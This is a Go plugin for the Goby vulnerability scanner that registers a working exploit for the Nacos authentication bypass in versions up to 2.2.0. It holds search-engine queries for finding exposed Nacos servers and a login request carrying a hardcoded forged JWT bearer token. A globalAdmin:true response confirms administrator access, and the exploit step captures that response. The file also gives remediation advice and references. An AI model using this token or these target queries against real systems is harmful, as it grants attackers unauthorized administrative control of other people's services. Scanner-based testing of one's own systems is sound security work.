package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Nacos Authentication Bypass Vulnerability",
    "Description": "<p>Nacos is a service management platform for building cloud native applications.</p><p>The open source service management platform Nacos has a high-risk vulnerability of authentication bypass in versions 0.1.0 to 2.20, which causes attackers to bypass key authentication and enter the background, resulting in system control and other consequences.Nacos is a service management platform for building cloud native applications.</p>",
    "Product": "NACOS",
    "Homepage": "https://nacos.io/zh-cn/index.html",
    "DisclosureDate": "2023-03-14",
    "Author": "su18@javaweb.org",
    "FofaQuery": "title==\"Nacos\" || (body=\"Alibaba Group Holding Ltd.\" && body=\"src=\\\"js/main.js\" && body=\"console-fe\") || (banner=\"/nacos/\" && (banner=\"HTTP/1.1 302\" || banner=\"HTTP/1.1 301 Moved Permanently\")) || banner=\"realm=\\\"nacos\"",
    "GobyQuery": "title==\"Nacos\" || (body=\"Alibaba Group Holding Ltd.\" && body=\"src=\\\"js/main.js\" && body=\"console-fe\") || (banner=\"/nacos/\" && (banner=\"HTTP/1.1 302\" || banner=\"HTTP/1.1 301 Moved Permanently\")) || banner=\"realm=\\\"nacos\"",
    "Level": "3",
    "Impact": "<p>The open source service management platform Nacos has a high-risk vulnerability of authentication bypass in versions 0.1.0 to 2.20, which causes attackers to bypass key authentication and enter the background, resulting in system control and other consequences.</p>",
    "Recommendation": "<p>Please update to the latest version to avoid this vulnerability. https://github.com/alibaba/nacos/releases/tag/2.2.0.1</p>",
    "References": [
        "https://nacos.io/zh-cn/docs/v2/guide/user/auth.html",
        "https://github.com/alibaba/nacos/issues/10060"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/v1/auth/users/login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg4Nzk5NX0.w2VzOFqZYQTMhwpkZ5w4BeyCLPWfY982zTbNSvvfnb4"
                },
                "data_type": "text",
                "data": "username=aabbccd&password=wdqdqda"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"username\":\"nacos\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"globalAdmin\":true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/v1/auth/users/login",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg4Nzk5NX0.w2VzOFqZYQTMhwpkZ5w4BeyCLPWfY982zTbNSvvfnb4"
                },
                "data_type": "text",
                "data": "username=aabbccd&password=wdqdqda"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"username\":\"nacos\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"globalAdmin\":true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.9",
    "Translation": {
        "CN": {
            "Name": "Nacos 身份认证绕过漏洞",
            "Product": "NACOS",
            "Description": "<p>Nacos 是构建云原生应用的服务管理平台。</p><p>开源服务管理平台 Nacos 在<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">&nbsp;</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">0.1.0~2.2.0 版本存在认证绕过高危漏洞，导致攻击者可以绕过密钥认证进入后台，造成系统受控等后果。</span><br></p>",
            "Recommendation": "<p>请更新至最新版本以避免此漏洞：<a href=\"https://github.com/alibaba/nacos/releases/tag/2.2.0.1\" target=\"_blank\">https://github.com/alibaba/nacos/releases/tag/2.2.0.1</a></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">开源服务管理平台 Nacos 在</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">&nbsp;</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">0.1.0~2.2.0 版本存在认证绕过高危漏洞，导致攻击者可以绕过密钥认证进入后台，造成系统受控等后果。</span><br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Nacos Authentication Bypass Vulnerability",
            "Product": "NACOS",
            "Description": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\"><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">Nacos is a service management platform for building cloud native applications.</span><br></span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">The open source service management platform Nacos has a high-risk vulnerability of authentication bypass in versions 0.1.0 to 2.20, which causes attackers to bypass key authentication and enter the background, resulting in system control and other consequences.</span>Nacos is a service management platform for building cloud native applications.</p>",
            "Recommendation": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">Please update to the latest version to avoid this vulnerability.&nbsp;<a href=\"https://github.com/alibaba/nacos/releases/tag/2.2.0.1\" target=\"_blank\">https://github.com/alibaba/nacos/releases/tag/2.2.0.1</a></span><br></p>",
            "Impact": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">The open source service management platform Nacos has a high-risk vulnerability of authentication bypass in versions 0.1.0 to 2.20, which causes attackers to bypass key authentication and enter the background, resulting in system control and other consequences.</span><br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10715"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}